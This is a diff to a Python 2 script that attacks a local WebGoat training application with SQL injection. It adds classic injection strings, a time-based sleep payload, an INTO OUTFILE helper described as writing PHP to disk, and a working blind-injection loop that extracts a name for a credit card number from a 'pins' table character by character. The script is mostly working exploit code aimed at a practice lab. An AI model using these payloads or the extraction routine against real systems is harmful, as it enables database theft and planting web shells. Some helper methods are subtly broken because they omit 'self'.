@@ -1,3 +1,4 @@
+
 import urllib
 import cookielib
 import urllib2
@@ -12,6 +13,8 @@ class httpclient:
 			urllib2.HTTPCookieProcessor(self.cookies)
 			]
 		self.magic_inputs = ["'+'%'+'", "'", "' OR 1=1", "#" , "1' or '1' = '1'))/*", "1' or '1' = '1'))#"]
+		
+
 
 	def decorate(self, request):
 		# do nothing
@@ -71,6 +74,33 @@ class httpclient:
 # domain_specified, domain_initial_dot, path, path_specified,
 # secure, expires, discard, comment, comment_url, rest, rfc2109=False)	
 		return Cookie(None, name, value, None, False, domain, False, False, '/', True, False, '1370002304', False, 'TestCookie', None, None, False)
+	
+	def query_limit(offset, count):
+		return " LIMIT "+str(offset) + "," + str(count)
+	
+	def sleep_query(seconds):
+		return " and sleep("+str(seconds) + ")"
+
+	# write some php into outfile
+	def write_file(content, outfile):
+		return 'SELECT \'' + content + '\' into outfile ' + outfile
+
+	# data getter (x,y) <- x,y - injectable parameter, e.g. query
+	# confirm(x) <- data pass
+	# iterable1 <- e.g. character position
+	# iterable2 <- e.g. allowed characters
+	def blind_check(self,data_getter, confirm, iterable1, iterable2):
+		result = list()
+		for i1 in iterable1:
+			confirmed = False
+			for i2 in iterable2:
+				if (confirm(data_getter(i1,i2))):
+					result.append(i2)
+					confirmed = True
+					break
+			if (confirmed == False):
+				return result
+		return result
 
 cat = httpclient()
 #cat.cookies.set_cookie(cat.make_cookie('JSESSIONID','A8A9EB6C28315BAE0E381B82CD81D894'))
@@ -80,17 +110,23 @@ cat = httpclient()
 	#data = cat.get('http://localhost:8080/WebGoat/attack', {'Screen':308, 'menu':200, 'File': t + 'WebGoat\\WEB-INF/spring-security.xml', 'SUBMIT': 'View+File'}, {('Cookie','JSESSIONID=A8A9EB6C28315BAE0E381B82CD81D894')})
 	#print(data.read())
 	
-data = cat.get('http://localhost:8080/WebGoat/plugin_extracted/plugin/ClientSideFiltering/jsp/clientSideFiltering.jsp?userId=112', {}, {('Cookie','JSESSIONID=A8A9EB6C28315BAE0E381B82CD81D894')})
-print(data.read())
+#data = cat.get('http://localhost:8080/WebGoat/plugin_extracted/plugin/ClientSideFiltering/jsp/clientSideFiltering.jsp?userId=112', {}, {('Cookie','JSESSIONID=1453EBAA61291CAFCB0F015160D69D09')})
+#print(data.read())
 
+def blind_example():
+		def confirm(data):
+			return 'Account number is valid' in data
 
-def confirm(data):
-	return 'Account number is valid' in data
-	
+		def data_getter(pos,letter):
+				data =  cat.get('http://localhost:8080/WebGoat/attack', 
+					{'Screen':1315528047,'menu' :1100, 'SUBMIT' : 'Go!',
+						'account_number' : '102 and (1=(SELECT COUNT(*) from pins where substr(name,' + str(pos) + ',1)=\''+chr(letter)+'\' and cc_number=\'4321432143214321\' ))'}, 
+					 {('Cookie','JSESSIONID=1453EBAA61291CAFCB0F015160D69D09')}).read()
+				print(data)
+				return data
 
-def get_letter():
-	for letter in range(65,122):
-		{'Screen':267,'menu' :1100,
-		'account_number' : '102 and (1=(SELECT COUNT(*) from pins where substr(name,' + str(pos) + ',1)=\''+chr(letter)+'\' and cc_number=\'4321432143214321\' ))'}
-		http://localhost:8080/WebGoat/attack?Screen=267&menu=1100&account_number=102+and+(1%3D(SELECT+COUNT(*)+from+pins+where+cc_number%3D%274321432143214321%27))&SUBMIT=Go!
-	
+		letters = range(65, 123)
+		positions = range(0, 60)
+
+		discovery = cat.blind_check(data_getter, confirm, positions, letters)
+		print([ chr(x) for x in discovery])
